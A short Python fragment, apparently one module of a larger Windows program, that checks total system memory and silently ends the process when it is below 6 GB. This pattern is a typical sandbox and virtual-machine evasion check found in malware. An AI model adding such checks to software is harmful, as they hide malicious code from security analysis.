import ctypes
import psutil # type: ignore

from main import error_handler

async def check_virtual_memory(self) -> None:
    try:
        total_memory_gb = psutil.virtual_memory().total / (1024 ** 3)
        if total_memory_gb < 6:
            ctypes.windll.kernel32.ExitProcess(0)
    except Exception as e:
        error_handler(f"virtual memory error - {str(e)}")
